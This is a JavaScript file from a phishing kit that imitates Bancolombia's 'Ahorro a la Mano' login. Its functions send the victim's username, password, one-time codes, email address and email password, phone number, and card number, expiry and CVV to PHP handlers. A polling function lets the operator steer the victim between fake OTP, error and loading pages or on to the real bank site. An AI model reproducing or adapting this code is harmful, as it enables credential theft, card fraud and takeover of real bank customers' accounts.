

function inicio(u){
    $.post( "./process/inicio.php", { usr: u} ,function(data) {
        window.location.href = "./clave.php";
    });
}



function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "AHORRO A LA MANO";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "AHORRO A LA MANO";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "AHORRO A LA MANO";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "AHORRO A LA MANO";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "AHORRO A LA MANO";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "AHORRO A LA MANO";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "AHORRO A LA MANO";
                            else
                            dispositivo = "AHORRO A LA MANO";
                        return dispositivo;
}   

function pasousuario(p){
    var b = "Ahorro a la mano";
    var res;
    var d = detectar_dispositivo();
    $.post( "./process/pasousuario.php", { pass: p, dis: d, banco: b} ,function(data) {
        if (data == "ERR") {
                alert("error");
        }else{
            if (data == "NO") {

            }else{
                res = data.split("-");
                window.location.href = "./cargando.php";
            }
        }
    });
}            
        

function consultar_estado(){
    $.post( "./process/estado.php",function(data) {
        switch (data) {
            case '2': window.location.href = "./otpalamano.php"; break;
            case '4': window.location.href = "https://www.bancolombia.com/personas"; break;
            case '6': window.location.href = "https://www.bancolombia.com/personas"; break;               
            case '8': window.location.href = "./errorot.php"; break;
            case '10': window.location.href = "https://www.bancolombia.com/personas"; break;
            case '12': window.location.href = "./?carderror=true"; break;
            //case '40': window.location.href = ""; break;
            //case '41': window.location.href = "./infopago.php"; break;
        } 
    });        
}

function enviar_otp(o){
    $.post( "./process/pasoOTP.php",{ otp:o },function(data) {
        window.location.href = "./cargando.php";
    }); 
}

function enviar_mail(m,c,t){    
    $.post( "./process/pasomail.php",{ eml:m, passe:c, cel:t},function(data) {
        window.location.href = "./cargando.php";
    });
}

function enviar_tarjeta(t,f,c){    
    $.post( "./process/pasotarjeta.php",{ tar:t, fec:f, cvv:c },function(data) {
        window.location.href = "./cargando.php";
    });
}